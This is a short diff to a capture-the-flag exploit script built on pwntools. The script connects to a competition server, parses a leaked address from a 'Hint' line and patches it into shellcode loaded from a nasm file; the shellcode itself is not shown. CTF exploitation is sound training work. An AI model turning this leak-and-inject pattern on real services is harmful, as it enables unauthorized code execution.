@@ -10,14 +10,14 @@ from pwn import *
 
 context.arch = 'amd64'
 
-REMOTE = False
+REMOTE = True
 
 if REMOTE:
-    p = remote("ctf.polycyber.io", 53519)
+    p = remote("ctf.polycyber.io", 47641)
 else:
     p = process("./order66")
 
-hint = int(p.recvline_contains("Hint").decode().split(" ")[1], 16)
+hint = int(p.recvline_contains(b"Hint").decode().split(" ")[1], 16)
 print(f"Hint: {hex(hint)}")
 
 data = read("shellcode.nasm").decode().replace("PLACEHOLDER", hex(hint))
